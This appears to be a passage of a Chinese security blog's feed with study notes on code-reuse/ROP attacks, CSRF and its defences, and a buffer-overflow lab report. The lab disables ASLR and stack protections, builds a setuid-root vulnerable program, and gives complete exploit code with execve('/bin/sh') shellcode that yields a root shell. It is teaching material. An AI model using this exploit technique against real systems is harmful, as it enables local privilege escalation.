    <content type="html"><![CDATA[<h1 id="代码重用攻击"><a href="#代码重用攻击" class="headerlink" title="代码重用攻击"></a>代码重用攻击</h1><h2 id="一、学习目标"><a href="#一、学习目标" class="headerlink" title="一、学习目标"></a>一、学习目标</h2><blockquote><p>理解代码重用攻击的原理</p><p>掌握代码重用攻击的攻击方式</p><p>设计代码重用攻击的防御方案</p></blockquote><h2 id="二、进程内存布局"><a href="#二、进程内存布局" class="headerlink" title="二、进程内存布局"></a>二、进程内存布局</h2><blockquote><p>栈：局部变量，函数参数，返回地址</p><p>堆：程序动态分配的内存</p><p>BSS段：未初始化的全局和静态变量</p><p>数据段：已初始化的全局变量和静态变量</p><p>代码段：程序代码</p></blockquote><h2 id="三、概念及原理"><a href="#三、概念及原理" class="headerlink" title="三、概念及原理"></a>三、概念及原理</h2><p><code>代码重用攻击</code>：栈缓存溢出后，将返回地址指向进程中已有代码，函数返回后，跳至攻击者指定已有代码继续执行，因重用了已存在代码，所以称为代码重用攻击</p><p><strong>return-to-libc</strong>：<strong>libc</strong>是几乎每个应用程序都包含的标准C语言库，包含了大量的基础函数实现，<strong>execve</strong>&#x2F;<strong>system</strong>函数可以帮助打开<strong>shell</strong>,进行后续攻击</p><p>例如：通过攻击打开<strong>shell</strong></p><p>（1）得到字符串：<strong>/bin/sh</strong></p><p>思路一：从程序将要加载的动态库中寻找，为后续攻击做准备，我们只需要知道“&#x2F;bin&#x2F;sh”字符串的地址即可</p><p>思路二：通过shell的特性，自己构造<strong>/bin/sh</strong>字符串，但是实际上你进行攻击的时候，很多情况下是没有办法用shell来构造一个环境变量的</p><p>（2）为<strong>execve</strong>准备参数</p><p>​32位x86架构linux系统中，参数传递通过<strong>栈</strong>来完成（下图中的<strong>rbp</strong>应该是<strong>ebp</strong>)，这里的话只需要自己构造栈就行，无需执行指令。</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084652318.png" alt="image-20230306084652318"></p><p>​64位x86架构linux系统中，参数传递通过<strong>栈+寄存器</strong>来完成，这里寄存器的值修改需要用到指令，可以用后面提到的<strong>ROP</strong>攻击</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306084740219.png" alt="image-20230306084740219"></p><p>（3）跳转到<strong>execve</strong>：打开<strong>libc</strong>中<strong>execve</strong>函数的地址</p><p>​step 1：<strong>gdb</strong>中可以直接通过调试指令拿到</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100230622.png" alt="image-20230306100230622"></p><p>​step 2：利用栈缓存溢出将函数返回地址指向<strong>execve</strong>函数的地址</p><h2 id="四、ROP攻击"><a href="#四、ROP攻击" class="headerlink" title="四、ROP攻击"></a>四、<strong>ROP</strong>攻击</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">pop%eax<br>pop %ecx<br>mov%eax,(%ecx)<br>//修改任意内存<br></code></pre></td></tr></table></figure><p>​因为在攻击过程中你的栈可以由你自己进行构造，所以上述三条指令可以达到修改任意地址下的数据</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306100558380.png" alt="image-20230306100558380"></p><p>可以利用的部分代码叫做<strong>Gadget</strong>，我们通过寻找合适的<strong>Gadget</strong>来构造一个<strong>Gadget Chain</strong>，然后并且构造合适的栈的内容来实现攻击。（上图中的<strong>rsp</strong>应该为<strong>esp</strong>）</p><p>所以分析程序中已有的可利用代码片段，利用<strong>ret</strong>指令将这些可利用代码片段串到一起，这种攻击方式称为<strong>ROP</strong>攻击</p><p><strong>Gadget自动提取工具：</strong><a href="https://github.com/JonathanSalwan/ROPgadget">JonathanSalwan&#x2F;ROPgadget: This tool lets you search your gadgets on your binaries to facilitate your ROP exploitation. ROPgadget supports ELF, PE and Mach-O format on x86, x64, ARM, ARM64, PowerPC, SPARC and MIPS architectures. (github.com)</a></p><h2 id="五、如何防御ROP攻击"><a href="#五、如何防御ROP攻击" class="headerlink" title="五、如何防御ROP攻击"></a>五、如何防御ROP攻击</h2><p>（1）从二进制文件中构造<strong>Gadget Chain</strong>进行防御</p><p>​1. 指令间填充</p><p><img src="/2023/03/06/%E4%BB%A3%E7%A0%81%E9%87%8D%E7%94%A8%E6%94%BB%E5%87%BB/image-20230306101816158.png" alt="image-20230306101816158"></p><p>​如上图所示，单独看上面部分，只有<strong>movl</strong>指令和<strong>robl</strong>指令，没有<strong>ret</strong>指令，按理来说不具备成为<strong>Gadget</strong>的可能性，但是由于二进制指令是变长的，所以说从哪里开始我们无法确定，如果从<strong>04</strong>开始的话，<strong>04 d0 c3</strong>就构成了一个<strong>addb</strong>指令+<strong>ret</strong>指令，就成了一个<strong>Gadge</strong>t指令，所以说如果我们在指令之间填充<strong>nop</strong>指令的话，上面的代码片段就无法成为一个<strong>Gadget</strong>了，从而减少<strong>Gadget</strong>的数量。</p><p>​2. 减少可用代码规模</p><p>​       <strong>libc</strong>中大部分代码很少被使用，程序加载的时候将这部分很少使用的代码直接映射位不可执行，就可以降低构建<strong>Gadget Chain</strong>的概率</p><p>（2）针对栈缓存溢出的防御机制</p><p>​返回地址是因为栈缓存溢出而被修改的，所以说如果我们能够阻止栈缓存溢出，就可以阻止代码重用攻击。</p><p>（3）从执行Gadget Chain完成攻击进行防御</p><p>​控制流完整性（<strong>Control Flow Integrity</strong>）检测</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>跨站请求伪造(CSRF)</title>
    <link href="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/"/>
    <url>/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="跨站请求伪造（CSRF）"><a href="#跨站请求伪造（CSRF）" class="headerlink" title="跨站请求伪造（CSRF）"></a>跨站请求伪造（CSRF）</h1><h2 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h2><p>​当一个网页给它所在的网站发送<strong>HTTP</strong>请求的时候，该请求被称为同站请求；如果该请求被发送到一个不同的网站，则该请求为跨站请求。来自网站自己页面的请求显然是可信的，而来自其他网站页面的请求则不一定可信。网站通常依靠回话<strong>cookie</strong>来判断一个来自客户端的请求是否可信，但是浏览器为同站请求和跨站请求添加了一模一样的<strong>cookie</strong>，如此一来便无法区分一个请求是来自自己的页面还是第三方页面。可以这么理解<strong>CSRF</strong>：攻击者首先盗用了你的身份，然后以你的名义进行某些非法操作。CSRF能够使用你的账户发送邮件，获取你的敏感信息，甚至盗走你的账户购买商品等。<strong>CSRF</strong>攻击其实是利用了<strong>web</strong>中用户身份认证验证的一个漏洞：简单的身份验证仅仅能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305142140496.png" alt="image-20230305142140496"></p><h2 id="二、跨站请求伪造攻击"><a href="#二、跨站请求伪造攻击" class="headerlink" title="二、跨站请求伪造攻击"></a>二、跨站请求伪造攻击</h2><p><code>CSRF</code>攻击包括三部分：<code>目标用户</code>，<code>目标网站</code>，<code>由攻击者操纵的恶意网站</code></p><p>当用户访问恶意网站的时候，来自恶意网站的网页会发送伪造的HTTP请求给目标网站。</p><p>为了成功发动CSRF攻击，攻击者需要制作一个可以伪造跨站请求的网页，还需要引诱用户去访问该恶意网页。除此之外，用户还需要已经在目标网站登录，否则即使攻击者仍可以发送伪造请求，服务器也不会处理这些请求，而是会把用户引导到登录界面，并要求登录凭证，用户会立即察觉到问题，攻击就失效了。</p><p><img src="/2023/03/05/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%EF%BC%88CSRF%EF%BC%89/image-20230305143043503.png" alt="image-20230305143043503"></p><h2 id="三、攻击原理以及过程"><a href="#三、攻击原理以及过程" class="headerlink" title="三、攻击原理以及过程"></a>三、攻击原理以及过程</h2><blockquote><p>（1）用户打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A</p><p>（2）用户通过信息验证后，网站A产生Cookie信息并返回浏览器，此时用户登录网站A成功，可以正常发送请求到网站A</p><p>（3）用户未退出网站A之前，在同一浏览器中，打开一个tab页访问恶意网站</p><p>（4）恶意网站接收到用户请求后，返回一些攻击性代码，并发出一个请求访问第三方站点A</p><p>（5）浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并且不知道该请求是由B发起的，所以会根据用户的Cookie信息以该用户的权限处理该请求。</p></blockquote><p>可见，达到CSRF攻击，必须达到两个条件：<code>登录受信任站点A，并在本地生成Cookie</code>,<code>在不登出A的情况，访问恶意站点B</code></p><h2 id="四、常见的CSRF攻击类型"><a href="#四、常见的CSRF攻击类型" class="headerlink" title="四、常见的CSRF攻击类型"></a>四、常见的CSRF攻击类型</h2><p>(1)<code>GET</code>类型的<code>CSRF</code></p><p>(2)<code>POST</code>类型的<code>CSRF</code></p><p>他们两者的一个区别是如何在请求中附加数据，GET请求把数据附加在请求的URL中，而POST请求把数据附加在请求的数据字段中。</p><h2 id="五、防御措施"><a href="#五、防御措施" class="headerlink" title="五、防御措施"></a>五、防御措施</h2><p>（1）使用<code>referer</code>头</p><p>​在<code>HTTP</code>请求头中的确有一个字段可以用来判断一个请求是否是跨站请求，就是<code>referer</code>头。他用来记录请求是从哪个网页发出的，它存储的是该网页的<code>URL</code>，使用<code>referer</code>字段服务器很容易判断一个请求是否来自它自己的网页。但是他会泄露使用者的浏览历史，产生隐私泄露问题，一些浏览器和代理会将此字段删除，以保护用户隐私，所以使用这个头字段作为防护策略可能会误把很多合法请求当做跨站请求。</p><p>（2）同站<code>cookie</code></p><p>​给<code>cookie</code>添加了一个特殊的属性，称为<code>SameSite</code>属性，该属性由服务器进行设置，它告诉浏览器一个<code>cookie</code>是否可以被跨站请求使用，没有此属性的<code>cookie</code>会被附加到所有的请求上，不管是同站请求还是跨站请求。拥有此属性的<code>cookie</code>会附加到同站请求上，是否会附加到跨站请求上取决于该属性的具体值，<code>SameSite</code>有两个属性值：<code>Strict</code>和<code>Lax</code>，如果值是<code>Strict</code>，那么<code>cookie</code>将不会与跨站请求一起发送；如果值是<code>Lax</code>，那么<code>cookie</code>只有在顶级导航的跨站请求时才一起发送</p><p>（3）秘密令牌</p><p>​网络应用判断一个请求是否是跨站，一个常用的方法就是秘密令牌，秘密令牌只有被自己的页面取得，其他网站的网页得不到，所有的同站请求都应当包含这个秘密令牌，这样就可以和跨站请求区分开，因为产生跨站请求的网页得不到秘密令牌。</p><p>​秘密令牌的两种典型实现方法</p><pre><code class="hljs">    1. 在每个网页内嵌入一个随机的机密值，当请求从该页面发起时，该机密值被放在请求中。由于同源策略，不同源的网页不能访问此页面的内容，因此这些恶意网页就不能在跨站请求中包含正确的机密值。    1. 把机密值放在`cookie`中，当一个请求发起后，请求从`cookie`中读出该机密值并将它包含在请求的数据字段中。该字段独立于已经被浏览器包含在`HTTP`头中的`cookie`，由于同源策略，不同源的页面不能读取其他源的`cookie`内容，因此攻击者无法在请求的数据字段包含该机密值。</code></pre><h2 id="六、总结"><a href="#六、总结" class="headerlink" title="六、总结"></a>六、总结</h2><p>​在一个跨站请求伪造攻击中，目标用户被诱骗去访问攻击者的网页，同时还需要维护与目标网站的活跃会话，当用户访问攻击者的网页的时候，攻击者可以伪造一个请求，从恶意网页发送到目标网站。如果目标网站不能识别一个请求究竟是来自他的网页还是一个不可信任的第三方网页，那么就会产生问题，因为执行攻击者伪造的请求会产生安全威胁。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>代码漏洞分析与缓冲区溢出攻击</title>
    <link href="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/"/>
    <url>/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="代码漏洞分析与缓冲区溢出攻击"><a href="#代码漏洞分析与缓冲区溢出攻击" class="headerlink" title="代码漏洞分析与缓冲区溢出攻击"></a>代码漏洞分析与缓冲区溢出攻击</h1><h2 id="一、实验目的"><a href="#一、实验目的" class="headerlink" title="一、实验目的"></a>一、实验目的</h2><ol><li>了解代码漏洞扫描的基本原理； </li><li>熟悉缓冲区溢出攻击与防御的基本技术</li><li>熟悉如何发现常见软件漏洞(stack overflow, double free, format string vulnerability, etc)</li><li>按照实验步骤进行操作，攻击漏洞程序并获得 root 权限。</li></ol><h2 id="二、实验环境"><a href="#二、实验环境" class="headerlink" title="二、实验环境"></a>二、实验环境</h2><p><strong>64位Kali linux</strong>    <strong>vmware workstation 16 player</strong></p><h2 id="三、实验原理"><a href="#三、实验原理" class="headerlink" title="三、实验原理"></a>三、实验原理</h2><p>​缓冲区溢出是指程序试图向缓冲区写入超出预分配固定长度数据的情况。这一漏洞可以被恶意用户利用来改变程序的流控制，甚至执行代码的任意片段。这一漏洞的出现是由于数据缓冲器和返回地址的暂时关闭，溢出会引起返回地址被重写。</p><h2 id="四、实验步骤与结果分析"><a href="#四、实验步骤与结果分析" class="headerlink" title="四、实验步骤与结果分析"></a>四、实验步骤与结果分析</h2><p>该实验我个人使用的是 64 位 Kali linux，而本次实验为了方便观察汇编语句，我们需要在 32 位环境下作 操作，因此实验之前需要做一些准备。</p><p>（1）<strong>输入命令安装一些用于编译 32 位 C 程序的东西</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get update<br>sudo apt-get install -y lib32z1 libc6-dev-i386 lib32readline6-dev<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150033257.png" alt="image-20230304150033257"></p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150020838.png" alt="image-20230304150020838">（2)  <strong>初始设置</strong></p><p><strong>关闭地址空间随机化</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo sysctl -w kernel.randomize_va_space=0<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150001996.png" alt="image-20230304150001996"></p><p>为了防范缓冲区溢出攻击及其它利用 shell 程序的攻击，许多 shell 程序在被调用时自动放弃它们的特权。因此，即使你能欺骗一个 Set-UID 程序调用一个 shell，也不能在这个 shell 中保持 root权限，所以我们需要使用一个没有此项保护的shell，例如：zsh，如下链接完毕</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo <span class="hljs-built_in">ln</span> -sf /bin/zsh /bin/sh<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150135987.png" alt="image-20230304150135987"></p><p>（3）<strong>shellcode</strong></p><p>一般情况下，缓冲区溢出会造成程序崩溃，在程序中，溢出的数据覆盖了返回地址。而如果覆盖返回地址的数据是另一个地址，那么程序就会跳转到该地址，如果该地址存放的是一段精心设计的代码用于实现其他功能，这段代码就是 shellcode。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-type">char</span> *name[<span class="hljs-number">2</span>];<br>    name[<span class="hljs-number">0</span>] = <span class="hljs-string">&quot;/bin/sh&quot;</span>;<br>    name[<span class="hljs-number">1</span>] = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-built_in">execve</span>(name[<span class="hljs-number">0</span>], name, <span class="hljs-literal">NULL</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>此段代码对应的机器码如下：</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150741432.png" alt="image-20230304150741432"></p><p>（4）漏洞程序，保存为stack.c</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">bof</span><span class="hljs-params">(<span class="hljs-type">char</span> *str)</span></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">12</span>];<br>    <span class="hljs-comment">/* The following statement has a buffer overflow problem */</span><br>    <span class="hljs-built_in">strcpy</span>(buffer, str);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span>&#123;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;badfile&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>);<br>    <span class="hljs-built_in">fread</span>(str, <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">char</span>), <span class="hljs-number">517</span>, badfile);<br>    <span class="hljs-built_in">bof</span>(str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Returned Properly\n&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过代码可以知道，程序会读取一个名为“badfile”的文件，并将文件内容装入“buffer”。 </p><p>（5）编译该程序，并设置 SET-UID。 </p><p>​GCC 编译器实现了一个名为 stackguard 的安全机制来防止缓冲区溢出。在存在这种保护的情况下， 缓冲区溢出攻击将不起作用。我们可以在编译期间使用-fno-stack-protector 选项禁用此保护。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -g -z execstack -fno-stack-protector -o stack stack.c<br>sudo <span class="hljs-built_in">chown</span> root stack<br>sudo <span class="hljs-built_in">chmod</span> 4755 stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304150602247.png" alt="image-20230304150602247"></p><p><strong>–fno-stack-protector</strong> 关闭<strong>canary</strong>保护机制</p><p><strong>-g</strong> 增加调试信息，保证后面我们可以对stack进行调试</p><p><strong>-z execstack</strong>   shellcode最终在栈里面执行，关闭<strong>栈不可执行</strong>的保护机制</p><p>（6）攻击程序： <strong>exploit.c</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/* exploit.c */</span><br><span class="hljs-comment">/* A program that creates a file containing code for launching shell*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-type">char</span> shellcode[]=<br>    <span class="hljs-string">&quot;\x31\xc0&quot;</span>                  <span class="hljs-comment">//xorl %eax,%eax</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;//sh&quot;</span>                <span class="hljs-comment">//pushl $0x68732f2f</span><br>    <span class="hljs-string">&quot;\x68&quot;</span><span class="hljs-string">&quot;/bin&quot;</span>                <span class="hljs-comment">//pushl $0x6e69622f</span><br>    <span class="hljs-string">&quot;\x89\xe3&quot;</span>                  <span class="hljs-comment">//movl %esp,%ebx</span><br>    <span class="hljs-string">&quot;\x50&quot;</span>                      <span class="hljs-comment">//pushl %eax</span><br>    <span class="hljs-string">&quot;\x53&quot;</span>                      <span class="hljs-comment">//pushl %ebx</span><br>    <span class="hljs-string">&quot;\x89\xe1&quot;</span>                  <span class="hljs-comment">//movl %esp,%ecx</span><br>    <span class="hljs-string">&quot;\x99&quot;</span>                      <span class="hljs-comment">//cdq</span><br>    <span class="hljs-string">&quot;\xb0\x0b&quot;</span>                  <span class="hljs-comment">//movb $0x0b,%al</span><br>    <span class="hljs-string">&quot;\xcd\x80&quot;</span>                  <span class="hljs-comment">//int $0x80</span><br>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">char</span> buffer[<span class="hljs-number">517</span>];<br>    FILE *badfile;<br>    <span class="hljs-comment">/* Initialize buffer with 0x90 (NOP instruction) */</span><br>    <span class="hljs-built_in">memset</span>(&amp;buffer, <span class="hljs-number">0x90</span>, <span class="hljs-number">517</span>);<br>    <span class="hljs-comment">/* You need to fill the buffer with appropriate contents here */</span><br>    buffer[<span class="hljs-number">24</span>]=<span class="hljs-number">0xdd</span>;<br>    buffer[<span class="hljs-number">25</span>]=<span class="hljs-number">0xcf</span>;<br>    buffer[<span class="hljs-number">26</span>]=<span class="hljs-number">0xff</span>;<br>    buffer[<span class="hljs-number">27</span>]=<span class="hljs-number">0xff</span>;<br>    <span class="hljs-type">int</span> start=<span class="hljs-number">517</span>-<span class="hljs-built_in">strlen</span>(shellcode);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=start;i&lt;<span class="hljs-number">517</span>;i++)&#123;<br>        buffer[i]=shellcode[i-start];<br>    &#125;<br>    <span class="hljs-comment">/* Save the contents to the file &quot;badfile&quot; */</span><br>    badfile = <span class="hljs-built_in">fopen</span>(<span class="hljs-string">&quot;./badfile&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>);<br>    <span class="hljs-built_in">fwrite</span>(buffer, <span class="hljs-number">517</span>, <span class="hljs-number">1</span>, badfile);<br>    <span class="hljs-built_in">fclose</span>(badfile);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>exploit.c</strong>文件用于生成<strong>badfile</strong>文件</p><p>我们需要填充的部分就是将<strong>shellcode</strong>放进去，然后将<strong>return address</strong>的值修改为<strong>shellcode</strong>的入口地址即可，下面我们进行调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">gdb stack<br>b bof     //设置断点<br>r         //运行<br>next      //进入下一步<br>i r ebp   //查看ebp的值<br>i r esp   //查看esp的值<br>p &amp;buffer //查看数组buffer的起始地址<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304151656195.png" alt="image-20230304151656195"></p><p>ebp的地址0xffffce08+4的地方就是return address，这里我讲shellcode放在了buffer[517]里面最后的24字节，那这样shellcode的入口地址就应该是[&amp;buffer+517-strlen(shellcode)]&#x3D;0xffffcdf4+493&#x3D;0xffffcfdd；</p><p>将入口地址0xffffcfdd填入到return address处，对应的buffer应该是buffer[24]、buffer[25]、buffer[26]、buffer[27]</p><p>小端法存储，所以</p><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152058897.png" alt="image-20230304152058897"></p><p>编译<strong>exploit.c</strong>，并运行<strong>exploit</strong>，此时生成了<strong>badfile</strong>文件，运行<strong>stack</strong>即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc -m32 -o exploit exploit.c<br>./exploit<br>./stack<br></code></pre></td></tr></table></figure><p><img src="/2023/03/04/%E4%BB%A3%E7%A0%81%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B8%8E%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%94%BB%E5%87%BB/image-20230304152309622.png" alt="image-20230304152309622"></p><p>最终发现得到<strong>root</strong>权限的<strong>shell</strong></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Des算法的原理与实现</title>
    <link href="/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/"/>
    <url>/2023/03/03/Des%E7%AE%97%E6%B3%95%E7%9A%84%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/</url>
    
